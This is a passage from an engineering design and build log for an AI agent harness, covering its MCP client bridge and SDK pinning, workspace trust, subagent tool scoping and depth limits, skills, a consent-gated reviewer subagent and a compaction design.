> **That revisit has since landed, and it did NOT take the prompt-level variation this section proposed.** Framings partition what each candidate looks for, so an omission becomes a systematic bias rather than noise. Diversity comes from a roster of different models (`config.ENSEMBLE_MODELS`), which needs no sampling parameter at all — so the refusal above no longer applies to ensemble mode, and AC5 below is superseded. `ENSEMBLE_TEMPERATURE` is deleted; `_sampling_kwargs` and its WARNING are kept as a backstop for the next caller. Decisions E1–E12 are in DEVLOG's §10-revisit entry.

### Research mode

Coarse by construction. `run_deep_research_pipeline()` is synchronous and reports nothing while running: each pass is drained through `run_to_completion()` inside the orchestrator, so no `LoopEvent` escapes, and the per-pass checkpoints it does write go to the database rather than to a caller. §16 therefore runs the pipeline on a worker (the app stays responsive, the raven animates) and renders the trace and report on completion. Live pass-by-pass progress, per-claim tier updates, and token streaming inside a pass require the pipeline to emit events — that is **§22**.

### Acceptance criteria

1. Slash commands dispatch through a registry other sections can register into; an unknown command reports itself rather than becoming a chat turn. Thread switching via `storage.list_threads()` (already exists — no `storage.py` change). Provider/model shown; theme and effort switchable at runtime.
2. A permission prompt shown mid-loop resumes the SAME generator with the user's response, verified end to end **against the dispatched tool**, not against the modal rendering. Denial and Escape both block the tool and both let the turn finish.
3. A tool call that raises results in a visible, graceful error notification, not an app crash — verified with `exit_on_error=False` explicitly set and a forced exception in a mocked tool call, and with the raven returning to idle rather than sticking mid-activity.
4. **(§16)** Effort switching offers only levels the current model reports, and the chosen level reaches the provider payload — asserted on the translated call arguments, not on the UI.
5. **(§16)** Ensemble mode on a sampling-rejecting model raises a clear error naming the model, before any LLM call or `PipelineRunRecord` row. **Superseded by §10's revisit** — ensemble mode no longer uses sampling variation, so it now runs on those models; what raises before any work is an unusable *roster* (`_ensemble_roster`), and the before-any-work half of this criterion carried over intact.

### Built

Implemented as specified above. **335 tests pass** (307 → 335). Full decision record in DEVLOG.md §16.

- `tui/` package (app, widgets, commands, screens, themes, ravens, `app.tcss`), `main.py --tui`.
- `core/client.py`: `_sampling_kwargs()`, `_thinking_for_provider()`, `effort_levels_for_model()`, `_google_supports_thinking_budget()`.
- `core/loop.py`: `effort` threaded through `_run()` and all three public wrappers.
- `config.py`: `MODELS_REJECTING_SAMPLING_PARAMS`, `MODEL_EFFORT_LEVELS`, `GOOGLE_THINKING_BUDGETS`, `DEFAULT_EFFORT`, `MAX_TOKENS` 4096 → 16000.
- `core/config_loader.py`: `_KNOWN_TUI`, and `_NESTED_SETTINGS` so the deep-merge stops naming sections inline.
- `core/reasoning/orchestrator.py`: the ensemble guard.

**One deviation, found by checking rather than assuming:** the pinned `google-genai==1.0.0` has a `ThinkingConfig` whose only field is `include_thoughts` — `thinking_budget` arrived in a later release, so the obvious implementation raises a `TypeError` against the version this repo actually pins. Rather than move the pin (which would put §9's verified Google implementation back in scope for retest to gain a feature Google users can do without), `_google_supports_thinking_budget()` checks the installed SDK and reports **no effort levels** on Google until the pin moves. D22's rule, applied to a second dependency.

---

## 17. MCP client — stdio + HTTP/SSE + `mcp.json` + async bridge + workspace trust

**This section changed the most of any in Rev. 2.** Rev. 1's `_make_handler()` returned a plain synchronous function that called `conn.call_tool(...)` directly — but the official MCP Python SDK is `async`/`await` end to end with no synchronous surface at all (verified against current SDK documentation, not assumed from memory). That function as written would crash or hang depending on caller context. Per D2a, the fix is a dedicated background thread owning one persistent event loop for all MCP traffic. **That decision survives Rev. 3's verification unchanged** — the async-only shape holds in both the current and the next major version of the SDK, so the bridge is the right call regardless of which one is pinned.

### (Rev. 3) The SDK is mid-major-version transition — pin it (D22)

Rev. 2's Open Question 6 asked whether §17's call shapes match the SDK's real signatures. Checking that turned out to matter more than expected, because the answer is version-dependent *right now*:

- **v1.x** is what §17's sketch targets, and its client API is confirmed correct in shape: `ClientSession(read, write)` wrapped around a transport context manager (`stdio_client(StdioServerParameters(...))` for stdio, `streamable_http_client(url)` for HTTP), `await session.initialize()` before any call, then `await session.call_tool(name, arguments={...})`. Note `arguments=` is a keyword, and `list_tools()` returns a result object whose `.tools` holds the tool list — not a bare list.
- **v2** reworks the client into a single `Client` that accepts a URL, a stdio subprocess, a custom transport, or an in-memory server object, with `await client.call_tool(...)` and `.structured_content` on the result. The SDK's own README instructs dependents to add a **`<2` upper bound** to their version constraint before v2 stable lands.
- The two lines' documentation disagreed at the time of writing about which is currently stable, so **treat the current state as unresolved and check at implementation time** — but that ambiguity is itself the argument for pinning rather than a reason to delay.

Concretely: `requirements.txt` gets an explicit pin with an upper bound (`mcp>=1.27,<2` if targeting v1.x as sketched). Rev. 2's dependency table specified `pyyaml` as "pin explicitly, even if already a transitive dependency" while leaving `mcp` — the only dependency actually mid-break — unpinned; that inconsistency is corrected in the table below.

Two things make v2 worth migrating to deliberately rather than resisting. Its unified `Client` collapses the stdio-vs-HTTP transport branch this section currently needs. And its in-memory transport connects a client straight to a server object with no subprocess and no sockets — which directly answers the "test infrastructure for the async bridge needs its own planning pass" item this document currently carries as deferred work.

### (Rev. 3) Session lifetime: sessions cannot outlive their context managers

`_connect_all_async()` as sketched does `_servers[name] = await self._connect_one(name, cfg)` and stores the session in a module-level dict. In v1.x both the transport and `ClientSession` are **async context managers**, so the natural implementation of `_connect_one` — `async with stdio_client(...) as (r, w): async with ClientSession(r, w) as s: await s.initialize(); return s` — returns a session that is *already closed*, because both `__aexit__` calls run before the return. Every subsequent `call_tool()` then fails.

The correct shape is an `AsyncExitStack` owned by the MCP loop and kept open for the process lifetime: `await stack.enter_async_context(...)` for the transport, then for the session, and the stack is closed only on shutdown. This must live on the dedicated MCP event loop — entering an async context on one loop and exiting it on another is undefined behavior, which is a second reason the single-owning-loop design in D2a is load-bearing rather than merely convenient.

That implies a shutdown path Rev. 2 didn't specify at all: `disconnect_all()` closing the exit stack via the same `run_coroutine_threadsafe` bridge, then `loop.call_soon_threadsafe(loop.stop)`, joined with a timeout. This is not tidiness — **stdio servers are child processes this harness spawned.** The `daemon=True` thread dies abruptly at interpreter exit without unwinding the stack, and the failure mode is orphaned subprocesses accumulating across sessions. Wire it to the same place the TUI and CLI already tear down.

### New file: `mcp/client.py`

```python
import asyncio
import threading

_mcp_loop: Optional[asyncio.AbstractEventLoop] = None
_mcp_thread: Optional[threading.Thread] = None
_servers: dict[str, "ClientSession"] = {}

def _ensure_mcp_loop() -> asyncio.AbstractEventLoop:
    global _mcp_loop, _mcp_thread
    if _mcp_loop is None:
        _mcp_loop = asyncio.new_event_loop()
        _mcp_thread = threading.Thread(target=_mcp_loop.run_forever, daemon=True)
        _mcp_thread.start()
    return _mcp_loop

class MCPClient:
    def __init__(self, server_configs: dict):
        self.server_configs = server_configs   # WAS missing entirely in Rev. 1 -- a real bug (C10)

    def connect_all(self) -> None:
        """Connects to every configured server. Runs on the dedicated MCP
        loop via the bridge below, even though this method itself is
        called synchronously from ordinary startup code."""
        loop = _ensure_mcp_loop()
        future = asyncio.run_coroutine_threadsafe(self._connect_all_async(), loop)
        future.result(timeout=30.0)

    async def _connect_all_async(self) -> None:
        for name, cfg in self.server_configs.items():
            _servers[name] = await self._connect_one(name, cfg)

    def call_tool(self, server_name: str, tool_name: str, params: dict, timeout: float = 180.0) -> dict:
        """The synchronous entry point every ToolSpec.handler actually
        calls. Looks completely ordinary to registry.dispatch() regardless
        of whether the caller is on Textual's main loop, a worker thread,
        or a plain synchronous CLI script -- the bridge is what makes this
        true from any of those contexts."""
        loop = _ensure_mcp_loop()
        coro = _servers[server_name].call_tool(tool_name, params)
        future = asyncio.run_coroutine_threadsafe(coro, loop)
        return future.result(timeout=timeout)   # 180s default (S12) -- MCP servers can be slow/hang
```

`_make_handler(server_name, tool_name)` now just returns `lambda params: mcp_client.call_tool(server_name, tool_name, params)` — a genuinely plain sync function, no bridging logic leaking into the tool layer itself.

### (Rev. 3) Result normalization at the bridge (D23)

`call_tool()` above is annotated `-> dict` but returns `future.result(...)` unchanged, which is the SDK's `CallToolResult` — a pydantic object carrying `.content` (a list of typed content blocks: `TextContent`, `ImageContent`, `EmbeddedResource`), `.structuredContent`, and `.isError`. Everything downstream of `dispatch()` assumes a plain dict, and two things break concretely:

- `check_output_policy()` calls `result.get(key)` and would raise `AttributeError` on a pydantic model. So MCP tool output — the output most likely to come from code the user didn't write — is exactly the output that would crash, or worse, bypass secret redaction.
- `memory.add_tool_result()` does `str(result)`, persisting a pydantic repr into the thread rather than readable content.

So `call_tool()` converts before returning, once, at the boundary:

```python
def _normalize(result) -> dict:
    """CallToolResult -> the plain dict shape every other tool handler
    returns. MCP signals tool failure IN BAND via isError rather than by
    raising, so it maps onto the same {"error": ...} convention _run()
    already understands for ToolCallDenied and disallowed-tool cases --
    no new error channel, no special-casing in the loop."""
    text = "\n".join(b.text for b in result.content if getattr(b, "type", None) == "text")
    if result.isError:
        return {"error": text or "MCP tool call failed"}
    out = {"content": text}
    if result.structuredContent is not None:
        out["result"] = result.structuredContent
    return out
```

`content` and `result` are deliberate key choices: both are already in `safety/policy_enforcement.py`'s `_SCANNED_KEYS`, so MCP output gets secret-redacted by the existing layer with no change to it. Non-text content blocks (images, embedded resources) are dropped to text placeholders for now — the harness has no multimodal tool-result path today, and inventing one here would be scope the rest of the design doesn't support yet.

### `mcp.json` and workspace trust

Project-level `mcp.json` is subject to the exact same workspace trust gate as project-level agents/skills/`CONTEXT.md` (§14, D17) — **this was the single most serious finding from review**: a project-level `mcp.json` with a `stdio` transport can specify an arbitrary local `command` to execute, and Rev. 1 had this auto-connecting on startup with zero confirmation. Concretely: connecting to any project-level MCP server now requires `workspace_trust.is_trusted(project_path)` to return `True` first — user-level `mcp.json` is unaffected (you authored it yourself) and continues to auto-connect as before.

### (Rev. 4) What actually shipped — v2, and two bugs in the design above

D22 said to re-verify the SDK at implementation time rather than trusting this document. That was
done, and it mattered: **`mcp` 2.0.0 shipped 2026-07-28**, before implementation started. The pin
is `mcp>=2.0,<3` and everything above describing v1 APIs is superseded by this subsection.

**API deltas (verified in hand against the installed package, not from docs):**

| v1 (above) | v2 (shipped) |
|---|---|
| `ClientSession(read, write)` + separate transport CM | `Client(server)` — one async CM taking a Transport, a URL string, or an in-process `MCPServer` |
| `.structuredContent` / `.isError` | `.structured_content` / `.is_error` (all fields snake_case) |
| `Tool.inputSchema` | `Tool.input_schema`, plus a new `.title` |
| `read_timeout_seconds: timedelta` | `read_timeout_seconds: float` |
| `McpError` | `MCPError`; protocol timeouts *raise* it (`-32001`) rather than returning in band |
| `httpx` / `httpx-sse` | `httpx2` (a second HTTP stack; `httpx` stays for anthropic/openai/ddgs) |
| — | `mode: ConnectMode = "auto"` probes `server/discover` and **falls back silently** to the legacy `initialize()` handshake, so it is the maximum-compatibility setting. Leave it alone. |

**Bug 1 — the file cannot be called `mcp/client.py`.** The project root is on `sys.path`, so a
top-level `mcp/` package shadows the installed SDK and `import mcp` inside it resolves to itself.
It ships as **`mcp_client/`**. This is the `logging.py` incident with a worse blast radius.

**Bug 2 — the `AsyncExitStack` shutdown design does not work.** Rev. 3 correctly says the stack
must live on the MCP loop, but the real constraint is stricter: **anyio binds cancel scopes to the
TASK**, and `run_coroutine_threadsafe()` creates a new task per call. Entering the stack in
`connect_all()` and closing it in `disconnect_all()` — exactly as sketched — dies with
`RuntimeError: Attempted to exit cancel scope in a different task than it was entered in`.
Reproduced against the real SDK before any production code was written.

The shipped shape is **one long-lived manager task** that enters every context, signals ready, then
parks on an event until shutdown, so the stack unwinds in the task that entered it. Per-call tasks
are unaffected. See `mcp_client/client.py`'s module docstring.

**Also found: D23's redaction claim was false.** "MCP output gets secret-redacted by the existing
layer with no change to it" held only for top-level strings. `structured_content` is arbitrary JSON
from a third-party server and arrives under `result` as a *dict*, which `check_output_policy()`
never scanned — so the output most likely to carry a leaked credential took the one unscanned path.
Fixed in `safety/policy_enforcement.py` (recursive, depth-bounded), not at the MCP boundary,
because the same hole applied to any tool returning nested data under a scanned key.

### Acceptance criteria

1. `MCPClient(server_configs).server_configs` is actually set and inspectable (regression test for C10).
2. `call_tool()` succeeds when called from a plain synchronous script, from inside a Textual worker thread, and from inside an already-running asyncio context — all three, since the bridge is specifically what makes context irrelevant.
3. A project-level `mcp.json` server does NOT connect until the project has been explicitly trusted; a user-level one connects without any trust check.
4. A hung/slow MCP server call times out at 180 seconds rather than blocking indefinitely.
5. An MCP tool name (`mcp__<server>__<tool>`) is correctly picked up by `_default_for_unknown_tool()` (§15) as allowed-by-default.
6. **(Rev. 3, D23) `call_tool()` returns a plain `dict`, never a `CallToolResult`** — asserted directly, plus an end-to-end check that a secret-shaped string in MCP output comes back redacted by the existing `check_output_policy()` layer, and that `isError: true` surfaces as `{"error": ...}` rather than raising.
7. **(Rev. 3) A connected session survives past `connect_all()` returning** — call a tool successfully some time after connection, which is the specific failure the `AsyncExitStack` design prevents and the naive `async with` version does not.
8. **(Rev. 3) `disconnect_all()` leaves no orphaned child processes** — spawn a stdio server, disconnect, assert the subprocess is reaped. Run it in the shutdown path the CLI and TUI actually use, not just in isolation.
9. **(Rev. 3, D22) `requirements.txt` pins `mcp` with an upper bound**, and the pinned version's client API matches the call shapes used in this section — re-verify at implementation time rather than trusting this document, since the version boundary was live when it was written.

---

## 18. Agent system — agent `.md` format + manager + subagent tool + per-agent scoping + intersection rule

### `AgentManager` (`agents/manager.py`)

Discovers agent `.md` files across all three tiers (§14), parses frontmatter into an agent definition, and exposes lookup by name. ~~Before this is built, verify `AgentManager` actually exposes every method §20 (subagent review) calls on it~~ — **SETTLED at §20's build.** The flagged mismatch was not real: §20 calls `get()`, `active_context()` and `system_prompt_for()`, all of which exist and none of which needed a signature change. See §20's "§18 AC3, closed".

### Subagent tool access: intersection, never union (fixes C6, locked in)

A subagent's effective `ToolContext.allowed_tools` is the **intersection** of its own declared `allowed_tools` and its parent's currently-active set — never a union. Without this, a restricted parent agent could spawn a permissively-declared subagent specifically to bypass its own restriction — a privilege-escalation path through nesting that would undermine "stricter wins" (§15) one hop removed. This applies uniformly regardless of whether the subagent is a built-in or project/user-defined one (per D18's reasoning: built-in agents are just pre-installed custom agents, not a separately-trusted code path).

### Subagent depth limiting (fixes C3, via the same mechanism as C6)

Rev. 1's `spawn_subagent` took a `depth: int = 0` parameter that `registry.dispatch()` could never actually populate (dispatch only ever passes `params`, parsed from the model's tool call — there was no path for an incremented depth value to reach a nested call at all). The fix is the same plumbing that fixes C6: **thread `ToolContext` itself through the spawn call**, with `subagent_depth` as a field on it (already present in §15's `ToolContext` dataclass), incremented by `spawn_subagent` each time it constructs a child context:

```python
# agents/subagent_tool.py
def run(params: dict, parent_context: ToolContext, max_depth: int = 2) -> dict:
    if parent_context.subagent_depth >= max_depth:
        return {"error": f"Maximum subagent nesting depth ({max_depth}) reached"}

    agent_def = agent_manager.get(params["agent_name"])
    child_allowed = (
        set(agent_def.allowed_tools) & (parent_context.allowed_tools or set(agent_def.allowed_tools))
    )
    child_context = ToolContext(
        allowed_tools=child_allowed,
        approval_overrides=agent_def.approval_overrides,
        subagent_depth=parent_context.subagent_depth + 1,
    )
    response = run_agent_conversation(
        user_goal=params["task"], model=agent_def.model, provider_name=agent_def.provider,
        allowed_tools=child_allowed,
    )
    return {"result": response.text}   # distilled, matching the pipeline's own "don't share raw" principle
```

`registry.dispatch()` needs to pass the CURRENT context through to any handler that declares a `parent_context` parameter — this is a signature-inspection concern for `dispatch()` to resolve when this is implemented (mirrors how tool handlers already vary in whether they take just `params` or more).

### Built-in agents requested during §16

Two wishlist items are agents, not TUI features, and land here:

- **`/grill-me`** — an agent that reads the current thread and surfaces what still needs a decision: ambiguities, unstated design choices, assumptions the work is resting on. Shaped like §20's reviewer (read distilled state, return a structured list), and like every other agent it runs through `RunAgentLoop` rather than getting its own LLM-calling path.
- **Goal mode** — a persistent objective, set once and folded into every subsequent turn's context so the agent stays oriented across a long session. **Decided: a persistent objective, not a rubric-graded iterate loop and not a loop-behaviour switch.** Needs thread-scoped state; `ConversationThread.extra_data` already exists. (It is no longer unused: §18 shipped goal mode into it via key-scoped `set_extra()`, so §23's todo list would coexist under its own key rather than owning the column.) The TUI renders it as a banner.

### Acceptance criteria

1. A subagent spawned by an agent restricted to `{read, web_search}` cannot access `shell` even if its own `.md` declares `allowed_tools: [shell]` — verified directly, not just asserted.
2. Nesting beyond `max_depth` returns a clear error rather than continuing to spawn.
3. `AgentManager`'s actual method surface is checked against every call site in §20 before §20 is considered complete.

### Built

Implemented; full decision record in DEVLOG §18, file contract in ARCHITECTURE.md §4.18. Deviations from the sketch above, all locked with the project owner before implementation:

- `spawn_subagent` receives its parent scope through `dispatch()` signature inspection — handlers declaring `parent_context` / `parent_run` receive them; the Rev. 1 `depth:` parameter and `allowed_tools=` kwarg never existed in code (§15 replaced the latter with `context=`). Generalised so §23's response-channel tools add a third injectable name without reopening `dispatch()`.
- `/agent <name>` is **session-scoped** (switch until `/agent default`); `/grill-me` runs one `continue_conversation` turn in the CURRENT thread; both register into §16's slash registry from `agents/tui_commands.py`. CLI unchanged (TUI-only commands, D12).
- Goal mode: persistent per-thread objective in `ConversationThread.extra_data`, written only by `/goal`, injected into every shell's prompt by `core.loop.with_goal()`, mirrored by a TUI `GoalBanner`.
- The §15–17 headless finalization landed here, widened from approval-only to callability per the owner: `schemas(callable_only=True)` drops approval-gated tools when no `permission_channel` exists, paired with a once-per-process WARNING naming them (no quiet invisibility).
- AC1/AC2 verified by `tests/test_agents.py` with revert-checks (union and disabled-filter both fail their tests). AC3: **verified at §20's build and closed** — §20's call sites are `get()`, `active_context()` and `system_prompt_for()`, all present, no mismatch.

---

## 19. Skill system — skill `.md` format + manager + activation + default skills — BUILT

**Unchanged from Rev. 1 in overall shape.** One resolved gap: Rev. 1 described a skill's `additional_tools` as merging into scope via "`ToolContext.allowed_tools` expansion **or** adding to the scoped registry" — presented as either/or without picking one, and the two have different semantics. Resolved by the same "stricter wins" principle as §15: **a skill can never grant a tool an active agent's `allowed_tools` has excluded.** The composition across however many layers happen to be active (global policy, the active agent, every currently-active skill) is: intersect every layer's allowed set; a tool is available only if every layer that expresses an opinion agrees. A skill's `additional_tools` only takes effect for tools the current agent (if any) hasn't already restricted away — it narrows what's *offered*, never widens past what's already been restricted.

### Default skills (D10)

Cybersecurity research, cryptography verification, proof writing, literature review — shipped as `skills/builtin/*.md`.

### Decisions record (K1–K7), added at build time

Two things forced decisions rather than transcription. **`additional_tools` could not do what its name said**, and **category folders** were requested during planning.

| # | Decision |
|---|---|
| **K1** | **Activation pins the skill's body into the system prompt** for every subsequent turn. `load_skill` already returns any body on request, so activation cannot be about *reading* one — a tool result is a single message that scrolls away and is subject to §21 compaction, while an activated skill governs the session. This is what gives `/skill` a purpose distinct from the tool. |
| **K2** | **`additional_tools` is a precondition, checked at activation, that does not block it.** See below. |
| **K3** | **`SkillManager` holds no state**; `activate`/`deactivate` take and return the active list, and the shell owns it. §25 demonstrated what "TUI-only" costs when a capability turns out to be needed elsewhere. |
| **K4** | **Recursive discovery for skills; category is metadata, not identity.** `skills/builtin/<category>/<skill>.md`, category derived from the folder. Names stay global, so `load_skill`, `/skill` and D18 are untouched and flat layouts keep working. Agents stay flat. |
| **K5** | **Activation is session-scoped and unpersisted**, matching `/agent` rather than `/goal`. |
| **K6** | **Active bodies are appended OUTSIDE `with_catalogs()`**, which feeds `pass_prompt()` — pinning inside it would inject a skill activated in a TUI chat session into all ten research passes. |
| **K7** | **Schemas need no mid-loop refresh.** Settles the Rev. 3 verification item below. |

### Why `additional_tools` was respecified

Rev. 1 described it as merging into scope; Rev. 4 resolved the composition as *intersection* ("stricter wins"). Both readings assume the field can add something. It cannot: `ToolContext.allowed_tools` is a **whitelist that narrows** — `None` means no opinion, a set restricts *to* that set. With no active agent everything globally allowed is already available; with one, AC1 forbids widening; a globally disabled tool is unreachable by D14 unconditionally. There is no configuration in which the field widens anything, so as a grant it is **inert in every case**.

It is therefore a **declaration of need**: `SkillManager.missing_tools()` checks each declared tool against the live `ToolContext` via `registry.is_allowed` — the same policy function that would refuse the call later — and `/skill` reports what is unavailable. Activation still succeeds, because a skill is often useful without an optional tool and refusing would make a restrictive agent silently un-pairable with half the catalog.

### Acceptance criteria

1. An active agent restricted to `{read}` plus an active skill wanting to add `shell` does NOT result in `shell` being available. ✓ — and the skill says so at activation rather than the model discovering it mid-turn.
2. Multiple simultaneously-active skills each adding different tools compose correctly (union of skill additions, still capped by the agent's restriction if one is active). ✓ **as a union of REQUIREMENTS** — this criterion's wording predates K2, and with additions impossible the thing that composes is what the skills need, each still capped by the agent's restriction.
3. *(added at build)* A skill activated in a chat session never appears in a research pass's system prompt (K6).
4. *(added at build)* Each shipped default declares only tools that are available under default config — a builtin reporting a missing tool on every activation would read as the feature being broken.

---

## 20. Subagent reviewing — opt-in post-pipeline review with consented correction — BUILT

**Materially expanded at build, by the project owner's decision.** Rev. 1 specified a read-only commentary stage: run a reviewer subagent over the finished run, record what it said. The owner's requirement was that the reviewer be able to **update incorrect information**, with **user consent for every change**. That turns a stage that could not affect anything into the only place in this codebase where a model's proposal can alter a finished run's output — which is where all the design work went.

### What changed from the Rev. 1 sketch, and why

**The reviewer reads more than `run.trace`.** Rev. 1's one line said the trace, and that was right for commentary: it is the audit log, and it was verified not to leak raw per-pass history. It cannot support *correction*. Trace is process log lines (`"Pass 2: extracted 14 claim(s)"`) describing what happened, not what was concluded, so nothing in it can be checked for truth. The reviewer now gets the annotated claims with their tiers, grounding and score breakdowns, the coverage gaps, the report, and the trace. Those are still the pipeline's own distilled outputs — the same artifacts a human reads — so "distill, don't share raw history" holds unchanged; no per-pass conversation thread is shared.

**The report is regenerated, not edited.** `final_report` was synthesised *from* the claims, so a correction that changes a claim and leaves the report alone produces one run with two artifacts that contradict each other. For a harness whose output is meant to be auditable, that is worse than either error alone.

### Decisions (V1–V9)

| # | Decision | Why |
|---|---|---|
| **V1** | The reviewer reads the distilled artifacts and proposes corrections to `Claim.final_text`, `Claim.confidence_tier`, or the synthesis | `run.trace` alone cannot support correction; the claims are still distilled, so the principle it was checked against is intact |
| **V2** | An accepted correction re-runs final synthesis; a review where everything was rejected does not | Nothing else keeps `report.md` and `02_claims.json` telling the same story. The re-synthesised report is **not** re-reviewed — that regress is cut deliberately |
| **V3** | The orchestrator invokes the stage; the shell supplies consent as data on a new `review=` parameter | The alternative — a post-pipeline stage each shell invokes, mirroring `write_run_artifacts` — is exactly the shape that produced this project's live asymmetry: that function had ONE production call site, so `/research` in the TUI wrote no output directory at all |
| **V4** | Three outcomes per finding — accept / reject / **refine with notes** — plus a reject-all-remaining escape | Refine is the case where the human knows something the reviewer missed. Reject-all is safe by construction because it only ever *declines*; the affordance that must not exist is the one that accepts in bulk |
| **V5** | Refine re-enters the **same reviewer thread** via `continue_conversation()`, scoped to that finding | §3's JSON-retry pattern reused — the one place this codebase already makes a model confront its own output. A stateless call loses why it proposed what it did, so a note can come back as the same error from another angle. A note about #3 must not silently redraft #7 |
| **V6** | No consent route ⇒ nothing is applied. The review still runs and still records | Mirrors §25's "headless means unable to ask". This is the property that keeps a *mutating* stage from widening the security stance |
| **V7** | The reviewer inherits the run's `RunAuthorization` unchanged — same grants, same provider, same `GrantBudget` **instance** | No new security axis. Its calls spend from the ceiling the launcher set and land in the same `granted_calls.json`. A rebuilt budget would silently raise that ceiling, which is §25's named failure mode |
| **V8** | No new `Claim` field and no new database column | A `Claim` field would be a fourth thing every `vars(c)` site must stay JSON-native for; a `PipelineRunRecord` column would break every existing database, because `create_all()` creates missing *tables* and never `ALTER`s. Provenance goes to `subagent_reviews` → `07_review.json`, one trace line per decision, and a `review_override` key inside the existing `score_breakdown` dict |
| **V9** | The TUI writes artifacts too | See V3. Fixing the asymmetry rather than moving the write into the orchestrator, which would trade it for the loss of the pipeline's freedom from filesystem side effects — load-bearing for testability and documented in `output_writer.py` |

### The distinction found at build: "requested" is not "can be asked"

`build_review_consent()` returns `None` when stdin is not a terminal — V6 by construction rather than by a check somewhere downstream. That makes the two facts separable and they must be separated: if the consent object alone enabled the stage, `--review` on a piped run would skip the review **entirely** and report nothing, on exactly the run the user asked to have checked. `run_deep_research_pipeline` therefore takes `subagent_review` (does it run) alongside `review` (can anyone be asked), with `None` falling back to `config.SUBAGENT_REVIEW` exactly as `ensemble_mode` does.

### The `synthesis` finding kind

A third kind beside `text` and `tier`, added because "the report overstates claim 4" has no correction target under claims-and-tiers-only: the claim is right, the prose is wrong. An accepted `synthesis` finding edits nothing — it appends a directive to the re-synthesis input, so the fix still travels through the same generation step every other correction does, rather than letting a model rewrite the report directly.

### Acceptance criteria

1. A run with `SUBAGENT_REVIEW` off and no consent route makes no reviewer call. ✓
2. A review with findings and **no consent route** leaves every claim and the report byte-identical, and still records the findings. ✓ (V6)
3. An accepted correction changes the claim **and** re-runs final synthesis from the corrected set; a fully-rejected review re-runs nothing. ✓ (V2 — both halves, since either alone passes against a version that always or never re-synthesises)
4. A refinement re-enters the reviewer's own thread and replaces only its own finding. ✓ (V5)
5. The reviewer's loop invocation carries the run's grants, provider and the *same* `GrantBudget` instance. ✓ (V7)
6. Both shells produce `/output/<run_id>/`, and `07_review.json` appears only on a reviewed run. ✓ (V9)
7. **`AgentManager`'s method surface matches every call site here** — §18's AC3, carried since Rev. 2 and now settled. ✓ See below.

### §18 AC3, closed

§18 could not resolve this against §20 because neither existed. §20's call sites are exactly three:

- `manager.get("pipeline-reviewer")`
- `manager.active_context(agent)` — depth 0, since the orchestrator is not running under a parent context
- `manager.system_prompt_for(agent, DEFAULT_SYSTEM_PROMPT)`

All three exist on `AgentManager` and none needed a signature change. **No mismatch.** The verification item is closed, not deferred.

### Built

Implemented; decision record in DEVLOG §20, file contracts in ARCHITECTURE.md. Two things landed alongside it because §20 was the first consumer that needed them:

- **`core/reasoning/json_retry.py`** — §3's malformed-JSON recovery, extracted from `orchestrator._run_pass_with_json_retry`, which hardcoded `run_deep_research_mode` as the first attempt and `pass_prompt(pass_id)` as the prompt to continue under. The reviewer is agent-shaped, so it needed the same recovery under a different prompt. The orchestrator's function keeps its name, signature and behaviour.
- **`authorization=` on `run_agent_conversation`** — the only public loop entry point that could not carry a `RunAuthorization`. §25 added it to the other two and stopped because nothing agent-shaped needed it yet. Passing it *and* `granted_tools` now raises rather than resolving silently.

---

## 21. Memory system — compaction, archive, thread-scoped pinning, user/project memory — BUILT (§21a + §21b + §21c)

**This section fully replaces Rev. 1's placeholder** (D16 originally called it a thin, deferrable truncation strategy). Discussion surfaced that this is, in substance, the long-term memory feature that was deliberately deferred at the very start of this project's build ("persistence yes, extracted long-term memory not yet") — it's arriving on schedule as the harness grows, not as scope creep.

### Design principle

Compaction should not destroy history. The existing `storage.py`/`MessageLog` schema already IS a permanent, append-only archive — nothing about it needs to change to serve as "the full record." What's missing is a *derived, computed view* of "what the agent sees this turn," layered on top of that archive, not a second independent copy of it (two independent writers of related data is exactly the shape of a real bug this project already found and fixed once — see ARCHITECTURE.md/DEVLOG.md §3.8).

### New table: `CompactionCheckpoint`

```python
class CompactionCheckpoint(SQLModel, table=True):
    thread_id: UUID
    summary_text: str
    covers_up_to_message_id: UUID   # everything in MessageLog through this id is represented by summary_text
    created_at: datetime
```

`ConversationMemory`'s "what does the agent see" computation: load the latest checkpoint for this thread (if any), synthesize it as a leading message, then load only the archive rows *after* `covers_up_to_message_id` verbatim. The archive (`MessageLog`) itself is never edited, reduced, or touched by compaction — full history stays intact and independently readable, which is what serves the "never lose old messages" requirement, using something that already exists rather than a new redundant store.

### Compaction is a built-in agent, not bespoke code

`agents/builtin/compactor.md` — summarizing an older segment of conversation is exactly the shape of an agent call (a system prompt, a task, a judgment-based output), so it runs through the exact same `RunAgentLoop` machinery as everything else, rather than needing its own one-off LLM-calling code path. This is also what gives the agent real autonomy over *what* to preserve, versus mechanical truncation, which can't exercise judgment at all.

### Hyperparameters: buffer, keep, strength

**(D27, locked) These are defaults, not settings.** Every value below is a starting point chosen to be reasonable, explicitly not claimed to be right, and overridable by the user without editing harness source. The architecture around them (buffer/keep/strength, objectively measurable ratio targets) is what's locked; the numbers are expected to move once there are real long threads to look at — the same posture `config.py` already takes toward `MAX_TOKEN_BUDGET`.

```python
# config.py additions -- DEFAULTS, overridable per D27 (see resolution order below)
COMPACTION_KEEP_RECENT_TOKENS = 4_000     # most recent tokens, always verbatim, never compacted
COMPACTION_BUFFER_TOKENS = 8_000          # compaction fires when context_used >= context_limit - buffer
COMPACTION_WARNING_MARGIN_TOKENS = 2_000  # warning fires this many tokens BEFORE the buffer threshold
COMPACTION_STRENGTH = 3                    # 1-5, maps to a target compression ratio, see below
COMPACTION_MAX_RETRIES = 2                 # bounded retry if the compactor misses its target ratio
```

**Resolution order**, reusing D19's existing settings split rather than inventing a mechanism: `config.py` default → user-level `~/.config/venastine/settings.json` → project-level `.venastine/settings.json` (trusted only, per D17) → per-invocation override (`/compact --strength 4` in the TUI, which applies to that one run and doesn't persist). Nearest wins, which is the same precedence the rest of the config system already uses, so there's nothing new to learn.

Three notes on making these settable rather than constant:

- **Validate and clamp on load.** `strength` outside 1–5, or a `buffer` larger than the model's whole context window, should be rejected with a clear message at load time, not produce incoherent trigger math at runtime. A project-level `settings.json` is content the user may not have authored (D17's whole premise), and while a hostile value here can't destroy anything — the `MessageLog` archive is never edited by compaction, which is exactly the property that makes this safe — an absurd `buffer` would force compaction constantly, and every compaction is a real LLM call the user pays for. Clamp to sane bounds and warn.
